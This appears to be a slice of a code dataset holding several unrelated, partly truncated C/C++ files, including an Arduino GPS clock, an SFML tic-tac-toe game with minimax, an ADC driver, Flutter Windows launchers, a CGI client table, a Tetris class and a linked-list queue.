@param numbertwo maximum value for random number\n */\nint random(int numberone, int numbertwo) {\n    int random = 0;\n    if ((numberone < 0) && (numbertwo < 0)) {\n        numberone = numberone * -1;\n        numbertwo = numbertwo * -1;\n        random = -1 * (rand()%(numberone + numbertwo));\n    }\n    if ((numbertwo < 0) && (numberone >= 0)) {\n        numbertwo = numbertwo * -1;\n        random = (rand()%(numberone + numbertwo)) - numbertwo;\n    }\n    if ((numberone < 0) && (numbertwo >= 0)) {\n        numberone = numberone * -1;\n        random = (rand()%(numberone + numbertwo)) - numberone;\n    } else {\n        random = (rand()%(numberone + numbertwo)) - min(numberone, numb",
    "// Including the required Arduino libraries\n#include <MD_Parola.h>\n#include <MD_MAX72xx.h>\n#include <SPI.h>\n#include <TinyGPS++.h>       // include TinyGPS++ library\n#include <TimeLib.h>         // include Arduino time library\n#include <SoftwareSerial.h>  // include software serial library\n\n// Uncomment according to your hardware type\n#define HARDWARE_TYPE MD_MAX72XX::FC16_HW\n//#define HARDWARE_TYPE MD_MAX72XX::GENERIC_HW\n\n// Defining size, and output pins\n#define MAX_DEVICES 8\n#define CS_PIN 9\n\nTinyGPSPlus gps;\n\n#define S_RX 3  // define software serial RX pin (No TX used)\n\nSoftwareSerial SoftSerial(S_RX, -1);  // configure SoftSerial library\n\n// Create a new instance of the MD_Parola class with hardware SPI connection\nMD_Parola myDisplay = MD_Parola(HARDWARE_TYPE, CS_PIN, MAX_DEVICES);\n\n#define time_offset -14400  // define a clock offset in seconds Note: (1 hour) ==> UTC + 1 (but in seconds)\n\n// variable definitions\nchar Time[] = \"TIME: 00:00:00\";\nchar Date[] = \"DATE: 00-00-2000\";\nbyte last_second, Second, Minute, Hour, Day, Month;\nint Year;\n\n// variable defaults\nbool timeIsSet = false;\n\nint h, m, s;\n\nint mill = 0;\n\nint timeout = 0;\nint lastMillis = 0;\nint lastCheck = 0;\n\nunsigned long currentMillis = 0;\n\nvolatile bool pulse = false;\n\n\nvoid setup() {\n  //Strictly utilized for debugging purposes.\n  Serial.begin(115200);\n\n  // Set the intensity (brightness) of the display (0-15)\n  myDisplay.begin();\n  myDisplay.setIntensity(0);\n  myDisplay.displayClear();\n  myDisplay.setTextAlignment(PA_LEFT);\n\n  cli();  // Disable interrupts\n    // Set Timer2 to interrupt every 1 ms\n  TCCR2A = 0;  // Set entire TCCR2A register to 0\n  TCCR2B = 0;  // Same for TCCR2B\n  TCNT2 = 0;   // Initialize counter value to 0\n  // Set compare match register to desired timer count.\n  OCR2A = 249;  // 16MHz / 64 (prescaler) / 250 = 1000 Hz\n  // Enable CTC mode\n  TCCR2A |= (1 << WGM21);\n  // Set prescaler to 64 and start the timer\n  TCCR2B |= (1 << CS22);\n  // Enable timer compare interrupt\n  TIMSK2 |= (1 << OCIE2A);\n\n  // Enable global interrupts\n  sei();  // Enable interrupts\n\n  attachInterrupt(digitalPinToInterrupt(2), PPS, RISING);  // Attach interrupt to pin 2, triggering on rising edge\n}\n\n// Triggered every 1ms, using timer2 interrupts for accurate (enough) timing of the milliseconds.\nISR(TIMER2_COMPA_vect) {\n  if (timeIsSet) {\n    mill++;  //increment by 1;\n  }\n}\n\nvoid loop() {\n  if (timeIsSet == false) {  //Determine whether the GPS is needed to set the initial time.\n    timeIsSet = true;\n\n    Serial.print(\"Time is being set...\");\n\n    SoftSerial.begin(9600);  // initialize software serial at 9600 baud\n\n    getTime();\n\n    SoftSerial.end();  // End it so that it does not interfere later...\n\n    Serial.println(\"done!\");\n\n    myDisplay.setTextAlignment(PA_LEFT);\n\n    h = String(hour()).toInt();\n    m = String(minute()).toInt();\n    s = String(second()).toInt();\n\n    mill = 0;\n    timeout = 0;\n  }\n\n  if (pulse) {\n    pulse = false;\n    timeout = 0;\n    mill = 0;\n\n    s++;\n  }\n\n\n  /*if (timeout >= 5000) {\n    timeout = 0;\n    timeIsSet = false;\n    Serial.println(\"Timed out, acquiring new time from GPS...\");\n  }*/\n\n\n  ////////////////// WORK WITH TIME ///////////////////\n\n  if (s > 59) {\n    s = 0;\n    m++;\n    mill = 0;\n  }\n  if (m > 59) {\n    m = 0;\n    h++;\n    mill = 0;\n  }\n  if (h > 23) {\n    h = 0;\n    m = 0;\n    s = 0;\n    mill = 0;\n  }\n\n  printTime(String(h).toInt(), String(m).toInt(), String(s).toInt(), String(mill).toInt());\n}\n\nvoid printTime(int hr, int mn, int sc, int ms) {\n  String hour_str = String(hr);\n  String minute_str = String(mn);\n  String second_str = String(sc);\n  String millisecond_str = String(ms);\n\n  // Format the data to fit on the display better, and increase readability;\n\n  if (hr < 10) {\n    hour_str = \"0\" + hour_str;\n  }\n\n  if (mn < 10) {\n    minute_str = \"0\" + minute_str;\n  }\n\n  if (sc < 10) {\n    second_str = \"0\" + second_str;\n  }\n\n  if (ms < 10) {\n    millisecond_str = \"0\" + millisecond_str;\n  } else if (ms < 100) {\n    millisecond_str = \"00\" + millisecond_str;\n  }\n\n  String data = hour_str + \":\" + minute_str + \":\" + second_str + \":\" + millisecond_str;\n\n  myDisplay.print(data);  // Update the display with the relevant information.\n}\n\nvoid getTime() {\n  bool completed = false;\n\n  myDisplay.displayClear();\n  myDisplay.setTextAlignment(PA_CENTER);\n  myDisplay.print(\"Finding Sats.\");\n\n  while (!completed) {\n    while (SoftSerial.available() > 0) {\n      if (gps.encode(SoftSerial.read())) {\n\n        // get time from GPS module\n        if (gps.time.isValid()) {\n          Minute = gps.time.minute();\n          Second = gps.time.second();\n          Hour = gps.time.hour();\n        }\n\n        // set currentMillis UTC time\n        setTime(Hour, Minute, Second, Day, Month, Year);\n\n        // add the offset to get local time\n        adjustTime(time_offset);\n\n        // update time array\n        Time[12] = second() / 10 + '0';\n        Time[13] = second() % 10 + '0';\n        Time[9] = minute() / 10 + '0';\n        Time",
    "\ufeff#include <vector>\r\n#include <iostream>\r\n#include <SFML/Graphics.hpp>\r\n\r\n#define BLANK 0\r\n#define CROSS 1\r\n#define ZERO 2\r\n\r\n#define CROSS_WON 10\r\n#define ZERO_WON 11\r\n#define TIE 12\r\n#define GAME_NOT_OVER 13\r\n\r\nusing namespace sf;\r\nusing namespace std;\r\n\r\nint game_situation(const vector<int>& board)\r\n{\r\n    if (board[0] == CROSS && board[1] == CROSS && board[2] == CROSS ||\r\n        board[3] == CROSS && board[4] == CROSS && board[5] == CROSS ||\r\n        board[6] == CROSS && board[7] == CROSS && board[8] == CROSS ||\r\n        board[0] == CROSS && board[3] == CROSS && board[6] == CROSS ||\r\n        board[1] == CROSS && board[4] == CROSS && board[7] == CROSS ||\r\n        board[2] == CROSS && board[5] == CROSS && board[8] == CROSS ||\r\n        board[0] == CROSS && board[4] == CROSS && board[8] == CROSS ||\r\n        board[2] == CROSS && board[4] == CROSS && board[6] == CROSS)\r\n        return CROSS_WON;\r\n    if (board[0] == ZERO && board[1] == ZERO && board[2] == ZERO ||\r\n        board[3] == ZERO && board[4] == ZERO && board[5] == ZERO ||\r\n        board[6] == ZERO && board[7] == ZERO && board[8] == ZERO ||\r\n        board[0] == ZERO && board[3] == ZERO && board[6] == ZERO ||\r\n        board[1] == ZERO && board[4] == ZERO && board[7] == ZERO ||\r\n        board[2] == ZERO && board[5] == ZERO && board[8] == ZERO ||\r\n        board[0] == ZERO && board[4] == ZERO && board[8] == ZERO ||\r\n        board[2] == ZERO && board[4] == ZERO && board[6] == ZERO)\r\n        return ZERO_WON;\r\n    for (auto i : board)\r\n    {\r\n        if (i == BLANK) return GAME_NOT_OVER;\r\n    }\r\n    return TIE;\r\n}\r\n\r\nint minimax(vector<int>& board, int alpha, int beta, bool is_zero) \r\n{\r\n    int gs = game_situation(board);\r\n    if (gs == CROSS_WON) return 1000;\r\n    if (gs == ZERO_WON) return -1000;\r\n    if (gs == TIE) return 0;\r\n\r\n    if (is_zero)\r\n    {\r\n        int min_score = 1e9;\r\n        for (int i = 0; i < 9; i++)\r\n        {\r\n            if (board[i] != BLANK) continue;\r\n            vector<int> tmp = board;\r\n            tmp[i] = ZERO;\r\n            int cur_score = minimax(tmp, alpha, beta, false);\r\n            min_score = min(min_score, cur_score);\r\n            beta = min(beta, cur_score);\r\n            if (beta <= alpha) break;\r\n        }\r\n        return min_score;\r\n    }\r\n    else\r\n    {\r\n        int max_score = -1e9;\r\n        for (int i = 0; i < 9; i++)\r\n        {\r\n            if (board[i] != BLANK) continue;\r\n            vector<int> tmp = board;\r\n            tmp[i] = CROSS;\r\n            int cur_score = minimax(tmp, alpha, beta, true);\r\n            max_score = max(max_score, cur_score);\r\n            alpha = max(alpha, cur_score);\r\n            if (beta <= alpha) break;\r\n        }\r\n        return max_score;\r\n    }\r\n}\r\n\r\nint main()\r\n{\r\n    RenderWindow window(sf::VideoMode(850, 850), \"Tic Tac Toe\");\r\n    \r\n    Texture field_tex;\r\n    field_tex.loadFromFile(\"../image/field.png\");\r\n    Sprite field_spr;\r\n    field_spr.setTexture(field_tex);\r\n    \r\n    Texture cross_tex;\r\n    cross_tex.loadFromFile(\"../image/cross.png\");\r\n\r\n    Texture zero_tex;\r\n    zero_tex.loadFromFile(\"../image/zero.png\");\r\n\r\n    vector<int> board(9, BLANK);\r\n    int cnt = 0;\r\n    bool game_over = false;\r\n\r\n    while (window.isOpen())\r\n    {\r\n        int gs = game_situation(board);\r\n        if (gs != GAME_NOT_OVER && !game_over)\r\n        {\r\n            switch (gs)\r\n            {\n            case CROSS_WON: cout << \"CROSS WON\" << endl; break;\r\n            case ZERO_WON: cout << \"ZERO WON\" << endl; break;\r\n            case TIE: cout << \"TIE\" << endl; break;\r\n            }\r\n            game_over = true;\r\n        }\r\n        \r\n        if (cnt % 2 == 1)\r\n        {\r\n            int best_move, min_eval = 1e9;\r\n            for (int i = 0; i < 9; i++)\r\n            {\r\n                if (board[i] == BLANK)\r\n                {\r\n                    vector<int> tmp = board;\r\n                    tmp[i] = ZERO;\r\n                    int cur = minimax(tmp, -1e9, 1e9, false);\r\n                    if (cur < min_eval)\r\n                    {\r\n                        min_eval = cur;\r\n                        best_move = i;\r\n                    }\r\n                }\r\n            }\r\n            board[best_move] = ZERO;\r\n            cnt++;\r\n        }\r\n\r\n        sf::Event event;\r\n        while (window.pollEvent(event))\r\n        {\r\n            switch (event.type)\r\n            {\r\n            case Event::Closed: window.close(); break;\r\n            case Event::KeyPressed:\r\n                if (event.key.code == Keyboard::R)\r\n                {\r\n                    board = vector<int>(9, BLANK);\r\n                    cnt = 0; game_over = false;\r\n                    system(\"cls\");\r\n                }\r\n                break;\r\n            case Event::MouseButtonPressed:\r\n                if (cnt % 2 == 0)\r\n                {\r\n                    if (game_over) continue;\r\n                    Vector2f ev = Vector2f(event.mouseButton.x < 825 ? event.mouseButton.x : 825,\r\n                        event.mouseButton.y < 825 ? event.mous",
    "#include <Arduino.h>\r\n#include <fmt/format.h>\r\n\r\n#define SCK 4\r\n#define DOUT 5\r\n#define SCLK_LOW digitalWrite(SCK, 0)\r\n#define SCLK_HIGH digitalWrite(SCK, 1)\r\n\r\nenum REG_MODS {\r\n  CH_SEL_A = 0b00,\r\n  CH_SEL_B = 0b01,\r\n  CH_SEL_CHIP_RETENTION = 0b01,\r\n  CH_SEL_TEMPERATURE = 0b10,\r\n  CH_SEL_INTERNAL_SHORT = 0b11,\r\n  PGA_SEL_1 = 0b00 << 2,\r\n  PGA_SEL_2 = 0b01 << 2,\r\n  PGA_SEL_64 = 0b10 << 2,\r\n  PGA_SEL_128 = 0b11 << 2,\r\n  SPEED_SEL_10 = 0b00 << 4,\r\n  SPEED_SEL_40 = 0b01 << 4,\r\n  SPEED_SEL_640 = 0b10 << 4,\r\n  SPEED_SEL_1280 = 0b11 << 4,\r\n  REF_ON = 0b0 << 6,\r\n  REF_OFF = 0b1 << 6\r\n};\r\n\r\nvoid CS1237Init()\r\n{\r\n\tpinMode(SCK, OUTPUT);\r\n\tpinMode(DOUT, INPUT_PULLUP);\r\n  delayMicroseconds(10);\r\n\tSCLK_LOW;\r\n}\r\n\r\nint CS1237isReady()\r\n{\r\n\treturn !digitalRead(DOUT);\r\n}\r\n\r\nvoid CS1237ClockUp()\r\n{\r\n\tSCLK_HIGH;\r\n\tdelayMicroseconds(10);\r\n\tSCLK_LOW;\r\n\tdelayMicroseconds(10);\r\n}\r\n\r\nvoid CS1237WriteConfig()\r\n{\r\n\t//no op\r\n\r\n  //pinMode(DOUT, OUTPUT);\r\n\r\n  while (!CS1237isReady());\r\n\r\n  // 1.\r\n  // Blank for 24 clock cycles, part of the spec\r\n  for (int i = 0; i < 24; i++)\r\n    CS1237ClockUp();\r\n\r\n  // 2.\r\n  // Skip the two register status reads, don't care yet\r\n  CS1237ClockUp();\r\n  CS1237ClockUp();\r\n\r\n  // 3.\r\n  // 27th SCLK pulls the /DRDY / DOUT high\r\n  CS1237ClockUp();\r\n\r\n  // 4.\r\n  // Between clock 28 and 29 switch DOUT to an output\r\n  CS1237ClockUp();\r\n  pinMode(DOUT, OUTPUT);\r\n  CS1237ClockUp();\r\n\r\n  // 5.\r\n  // Read 7 bits on input word to determine read or write\r\n  char writeReg = 0x65 << 1;\r\n  for (int i = 0; i < 7; i++)\r\n  {\r\n    digitalWrite(DOUT, 0x80 & writeReg);\r\n    writeReg <<= 1;\r\n    CS1237ClockUp();\r\n    SCLK_LOW;\r\n  }\r\n\r\n  // 6.\r\n  // Spare clock since we only write for now\r\n  CS1237ClockUp();\r\n\r\n  char settings = (CH_SEL_TEMPERATURE | PGA_SEL_128 | SPEED_SEL_1280 | REF_OFF);\r\n  for (int i = 0; i < 8; i++)\r\n  {\r\n    digitalWrite(DOUT, 0x80 & settings);\r\n    settings <<= 1;\r\n    CS1237ClockUp();\r\n  }\r\n\r\n  digitalWrite(DOUT, 0);\r\n\r\n\tSCLK_LOW;\r\n\tCS1237ClockUp();\r\n\tCS1237ClockUp();\r\n\tCS1237ClockUp();\r\n\tSCLK_LOW;\r\n\r\n  pinMode(DOUT, INPUT_PULLUP);\r\n}\r\n\r\nint CS1237ReadConfig()\r\n{\r\n  while (!CS1237isReady());\r\n\r\n  // 1.\r\n  // Blank for 24 clock cycles, part of the spec\r\n  for (int i = 0; i < 24; i++)\r\n    CS1237ClockUp();\r\n\r\n  // 2.\r\n  // Skip the two register status reads, don't care yet\r\n  CS1237ClockUp();\r\n  CS1237ClockUp();\r\n\r\n  // 3.\r\n  // 27th SCLK pulls the /DRDY / DOUT high\r\n  CS1237ClockUp();\r\n\r\n  // 4.\r\n  // Between clock 28 and 29 switch DOUT to an output\r\n  CS1237ClockUp();\r\n  pinMode(DOUT, OUTPUT);\r\n  CS1237ClockUp();\r\n\r\n  // 5.\r\n  // Read 7 bits on input word to determine read or write\r\n  char writeReg = 0x56 << 1;\r\n  for (int i = 0; i < 7; i++)\r\n  {\r\n    digitalWrite(DOUT, 0x80 & writeReg);\r\n    writeReg <<= 1;\r\n    CS1237ClockUp();\r\n    SCLK_LOW;\r\n  }\r\n\r\n  // 6.\r\n  //\r\n  CS1237ClockUp();\r\n  pinMode(DOUT, INPUT_PULLUP);\r\n\r\n  char settings = 0;\r\n  for (int i = 0; i < 8; i++)\r\n  {\r\n    CS1237ClockUp();\r\n    settings = (settings << 1) | digitalRead(DOUT);\r\n    SCLK_LOW;\r\n  }\r\n\r\n\tSCLK_LOW;\r\n\tCS1237ClockUp();\r\n\tCS1237ClockUp();\r\n\tCS1237ClockUp();\r\n\tSCLK_LOW;\r\n\r\n  return settings;\r\n}\r\n\r\nint CS1237Read()\r\n{\r\n\tint tmp = 0;\r\n\r\n\twhile (!CS1237isReady());\r\n\r\n\tfor (int i = 0; i < 24; i++)\r\n\t{\r\n    CS1237ClockUp();\r\n\t\ttmp = (tmp << 1) | digitalRead(DOUT);\r\n\t\tSCLK_LOW;\r\n\t}\r\n\r\n\tSCLK_LOW;\r\n\tCS1237ClockUp();\r\n\tCS1237ClockUp();\r\n\tCS1237ClockUp();\r\n\tSCLK_LOW;\r\n\r\n\treturn tmp;\r\n}\r\n\r\nlong getValue(int num)\r\n{\r\n\tlong weight = 0;\r\n\tfor(int i = 0; i < num; i++)\r\n\t{\r\n\t\tweight += CS1237Read();;\r\n\t}\r\n\treturn weight / num;\r\n}\r\n\r\nlong offset = 0;\r\n\r\nvoid tare()\r\n{\r\n  Serial.print(\"Interupt Triggered\");\r\n  offset = getValue(640);\r\n}\r\n\r\nvoid setup() {\r\n  Serial.begin(115200);\r\n  pinMode(24, INPUT_PULLUP);\r\n  //attachInterrupt(digitalPinToInterrupt(24), tare, CHANGE);\r\n  delayMicroseconds(10);\r\n  CS1237Init();\r\n  CS1237WriteConfig();\r\n}\r\n\r\nvoid loop() {\r\n  if (!digitalRead(24))\r\n    offset = getValue(128);\r\n\r\n  Serial.print(fmt::format(\"Attempting: {:>10} {:>10}\", CS1237Read() - offset, offset).c_str());\r\n  Serial.println();\r\n}\r\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"flutter_application_3\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"cgi.h\"\n#include <iostream>\n#include <fstream>\n#include <sstream>\n#include <vector>\n#include <string>\nusing namespace std;\n\nstruct Client {\n    string surname;\n    string gender;\n    int age;\n    string workplace;\n    double income;\n    string purpose;\n};\n\nvoid read_clients(const string& filename, vector<Client>& clients) {\n    ifstream file(filename);\n    if (!file.is_open()) {\n        cout << \"<p>Error: Unable to open file</p>\\n\";\n        return;\n    }\n    string line;\n    while (getline(file, line)) {\n        istringstream iss(line);\n        Client client;\n        iss >> client.surname >> client.gender >> client.age >> client.workplace >> client.income >> client.purpose;\n        clients.push_back(client);\n    }\n    file.close();\n}\n\nvoid display_clients(const vector<Client>& clients, const string& purpose) {\n    cout << \"<h2>\" << purpose << \" Queue</h2>\\n\";\n    cout << \"<table border='1'>\\n\";\n    cout << \"<tr><th>Surname</th><th>Gender</th><th>Age</th><th>Workplace</th><th>Income</th><th>Purpose</th></tr>\\n\";\n    for (const auto& client : clients) {\n        if (client.purpose == purpose) {\n            cout << \"<tr>\";\n            cout << \"<td>\" << client.surname << \"</td>\";\n            cout << \"<td>\" << client.gender << \"</td>\";\n            cout << \"<td>\" << client.age << \"</td>\";\n            cout << \"<td>\" << client.workplace << \"</td>\";\n            cout << \"<td>\" << client.income << \"</td>\";\n            cout << \"<td>\" << client.purpose << \"</td>\";\n            cout << \"</tr>\\n\";\n        }\n    }\n    cout << \"</table>\\n\";\n}\n\nint main() {\n    // Set content type\n    cout << \"Content-type: text/html\\n\\n\";\n\n    // Get form data\n    char* filename = nullptr;\n    cgi_utils::get_form_data(filename);\n\n    // Read clients from file\n    vector<Client> clients;\n    read_clients(filename, clients);\n\n    // Display clients with credit purpose\n    display_clients(clients, \"Credit\");\n\n    // Display clients with deposit purpose\n    display_clients(clients, \"Deposit\");\n\n    // Free memory\n    delete[] filename;\n\n    return 0;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"exchange_ease\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"Joc.h\"\n\nvoid Joc::inicialitza(const string& nomFitxer) //inicialitza amb dadels del fitxer\n{\n\tPosicio posicio; //variable para la posicion\n\tint tipus, gir; // variable para el tipo de figura + giro\n\tifstream fitxer;\n\tm_figuraposada = false;// indica si la figura esta \n\n\tfitxer.open(nomFitxer);\n\n\twhile (fitxer.is_open())\n\t{\n\tfitxer >> tipus;\n\tm_figura.incialitza(TipusFigura(tipus));\n\n\tfitxer >> posicio.y >> posicio.x;\n\n\tposicio.y--;\n\tposicio.x--;\n\n\tm_figura.setPosicio(posicio);\n\tm_posicio = posicio; \n\t\n\tfitxer >> gir; //numero de vegades q ha de girar\n\t\tfor (int i = 0; i < gir; i++)\n\t\t\tm_figura.girar(GIR_HORARI);\n\t\n\t\tfor (int i = 0; i < MAX_COL; i++)\n\t\t{\n\t\t\tfor (int j = 0; j < MAX_FILA; j++)\n\t\t\t{\n\t\t\t\tint color;\n\t\t\t\tfitxer >> color;\n\t\n\t\t\t\tm_tauler.setTauler(ColorFigura(color), i, j);\n\t\t\t}\n\t\t}\n\n\tfitxer.close();\n}\n\n}\n\nbool Joc::giraFigura(DireccioGir direccio)\n{\n\tbool gira = true;// indicar si el gir es valid\n\tm_figura.girar(direccio);\n\n\tif (!m_tauler.esMovimentValid(m_figura, m_posicio))//comprova si el moviment es valid\n\t{\n\t\tif (direccio == GIR_HORARI)\n\t\t\tm_figura.girar(GIR_ANTI_HORARI);\n\t\telse\n\t\t\tm_figura.girar(GIR_HORARI);//no valid\n\t\tgira = false;\n\t}\n\n\treturn gira;\n}\n\nbool Joc::mouFigura(int dirX)\n{\n    bool mou = true; \n    m_figura.moure(dirX); // mou la figura en la direcci\u00f3 indicada\n\n    while (!m_tauler.esMovimentValid(m_figura, m_figura.getPosicio())) //  mentre el movimient no es v\u00e1lido\n    {\n        // Si no valid = ajusta la posici\u00f3n de la figura\n        if (dirX == -1)\n            m_figura.moure(1); // mou  la figura a la derecha\n        else\n            m_figura.moure(-1); // mou la figura a la izquierda\n        mou = false; // moviment no valid\n    }\n\n    m_posicio = m_figura.getPosicio();// moviment valid = actualitza posicio\n\n    return mou;\n}\n\n\nint Joc::baixaFigura()\n{\n\tint nFiles = 0;//indicara el numero de files completades\n\tm_figura.baixar(1);\n\n     if (!m_tauler.esMovimentValid(m_figura, m_figura.getPosicio()))//verifica si el moviment es valid\n\t{\n\t\tm_figura.baixar(-1);//moviment no valid == la torna a pujar\n\t\tm_tauler.posarFigura(m_figura, m_figura.getPosicio());\n\t\tm_figuraposada = true;//figura colocada\n\t\tnFiles = m_tauler.eliminarFilesplenes();//elimina les files completades\n\t}\n\telse\n\t\tm_posicio = m_figura.getPosicio();\n\n\treturn nFiles;\n\n\n}\n\nvoid Joc::escriuTauler(const string& nomFitxer)// escriu com esta el tauler\n{\n\tint i, j;\n\tofstream fitxer;\n\n\tfitxer.open(nomFitxer);\n\n    while (fitxer.is_open())\n\t{\n\tif (!m_figuraposada)\n\t\tm_tauler.posarFigura(m_figura, m_posicio); // si la figura no esta la coloca pero temporalment\n\n\tfor (int i = 0; i < MAX_COL; i++)\n\t{\n\t\tfor (int j = 0; j < MAX_FILA; j++)\n\t\t\tfitxer << int(m_tauler.getTauler(i, j)) << \" \";\n\t\tfitxer << endl;\n\t}\n\n\tif(!m_figuraposada)\n\t\tm_tauler.eliminarFigura(m_figura, m_posicio); // Elimina la figura temporal\n\tfitxer.close();\n}\n\t\n}\n",
    "#include <iostream>\nusing namespace std;\nstruct node\n{\n\tint Data;\n\tnode* next;\n};\n\nnode* current = NULL;\nnode* Front = NULL;\nnode* Rear = NULL;\n\nvoid enqueue(int newdata)\n{\n\tnode* current = new node();\n\tcurrent->Data = newdata;\n\tif (Rear != NULL)\n\t{\n\t\tRear->next = current;\n\t\tRear = current;\n\t}\n\telse\n\t{\n\t\tFront = current;\n\t\tRear = current;\n\t}\n\tRear->next = NULL;\n}\nvoid dequeue()\n{\n\tif (Front != NULL)\n\t{\n\t\tcurrent = Front;\n\t\tFront = Front->next;\n\t\tdelete current;\n\t}\n\telse { cout << \"No element Found to be dequeued\" << endl; }\n}\nvoid dequeueAll()\n{\n\twhile (Front != NULL)\n\t{\n\t\tcurrent = Front;\n\t\tFront = Front->next;\n\t\tdelete current;\n\t}\n\tRear = Front = NULL;\n}\nvoid display()\n{\n\tif (Front != NULL)\n\t{\n\t\tcurrent = Front;\n\t\twhile (current != NULL)\n\t\t{\n\t\t\tcout << current->Data << endl;\n\t\t\tcurrent = current->next;\n\t\t}\n\t}\n\telse { cout << \"There is no data in the queue\\n\"; }\n}\nvoid app()\n{\n\t/*\n\t\top -> operation\n\t\tc -> confirm\n\t\te -> enqueue node\n\t\tao -> another operation\n\t\ts -> starter app\n\t*/\n\tint op, c, e, ao, s;\n\tcout << \"--- Welcome to queue implementation---\\n\";\n\tdo\n\t{\n\t\tcout << \"Choise what do you want\\n\";\n\t\tcout << \"Enqueue -> (1)\\n\";\n\t\tcout << \"Dequeue an Elements -> (2) \\n\";\n\t\tcout << \"Dequeue All Elements -> (3)\\n\";\n\t\tcout << \"Display -> (4)\\n\";\n\t\tcout << \"Exit -> (5)\\n\";\n\t\tcin >> op;\n\t\tswitch (op)\n\t\t{\n\t\tcase 1:\n\t\t\tcout << \"Enter value do you want to enqueue\\n\";\n\t\t\tcin >> e;\n\t\t\tenqueue(e);\n\t\t\tbreak;\n\t\tcase 2:\n\t\t\tcout << \"Are you sure to dequeue one node\\n\";\n\t\t\tcout << \"To Confirm Enter -> (1)\\n\";\n\t\t\tcout << \"To Cancel Enter -> any key\\n\";\n\t\t\tcin >> c;\n\t\t\tif (c == 1)\n\t\t\t{\n\t\t\t\tdequeue();\n\t\t\t\tcout << \"\\nCheck data of queue after dequeuing first node :\\n \";\n\t\t\t\tdisplay();\n\t\t\t}\n\t\t\telse {\n\t\t\t\tcout << \"Dequeue is canceled\\n\";\n\t\t\t}\n\t\t\tbreak;\n\t\tcase 3:\n\t\t\tcout << \"Are you sure to dequeue all nodes\\n\";\n\t\t\tcout << \"To Confirm Enter -> (1)\\n\";\n\t\t\tcout << \"To Cancel Enter -> any key\\n\";\n\t\t\tcin >> c;\n\t\t\tif (c == 1)\n\t\t\t{\n\t\t\t\tdequeueAll();\n\t\t\t\tcout << \"\\nCheck data of queue after dequeuing all nodes :\\n \";\n\t\t\t\tdisplay();\n\t\t\t}\n\t\t\telse {\n\t\t\t\tcout << \"Dequeue all is canceled\\n\";\n\t\t\t}\n\t\t\tbreak;\n\t\tcase 4:\n\t\t\tcout << \"Enqueue Elements are:\\n\";\n\t\t\tdisplay();\n\t\t\tbreak;\n\t\tcase 5:\n\t\t\treturn;\n\t\t\tbreak;\n\t\tdefault:\n\t\t\tcout << \"Wrong Input Try Again\\n\";\n\t\t}\n\t\tcout << \"Do you want another opration\\n\";\n\t\tcout << \"Yes -> 1 \\n\";\n\t\tcout << \"NO -> any key \\n\";\n\t\tcin >> ao;\n\t} while (ao == 1);\n}\nint main()\n{\n\tapp();\n\treturn 0;\n}",
    "#include \"../../headers/ss/nearest_pair.h\"\n\n\n\n/***************************\n* Implementacion O(n^2)\n***************************/\n\npair<int,int> nearestPairBrute(const vector <Cluster> &C) {\n    double min = DBL_MAX;\n    pair<int,int> nearest;\n    int n = C.size();\n    for (int i = 0; i < n; ++i) {\n        for (int j = i+1; j < n; ++j) {\n            double distance = dist(C[i], C[j]);\n            if (distance < min) {\n                min = distance;\n                nearest = {i,j};\n            }\n        }\n    }\n    \n    return nearest;\n}\n\n\n/***************************\n* Implementacion O(nlogn)\n***************************/\n\n// Codigo adaptado de https://www.geeksforgeeks.org/closest-pair-of-points-onlogn-implementation/\n\ntypedef struct {\n\tdouble x, y;\n\tint index;\n} IndexedPoint;\n\n\n// Needed to sort array of points according to X coordinate\nstatic int compareX(const void* a, const void* b){\n\tIndexedPoint *p1 = (IndexedPoint *)a,  *p2 = (IndexedPoint *)b;\n    double dif = (p1->x != p2->x) ? (p1->x - p2->x) : (p1->y - p2->y);\n    if(dif == 0) return 0;    // El codigo de referencia utiliza puntos con coords enteras. Debemos modificar la comparacion para que retorne int\n    return (dif > 0)? 1 : -1;\n}\n// Needed to sort array of points according to Y coordinate\nstatic int compareY(const void* a, const void* b){\n\tIndexedPoint *p1 = (IndexedPoint *)a,  *p2 = (IndexedPoint *)b;\n\tdouble dif = (p1->y != 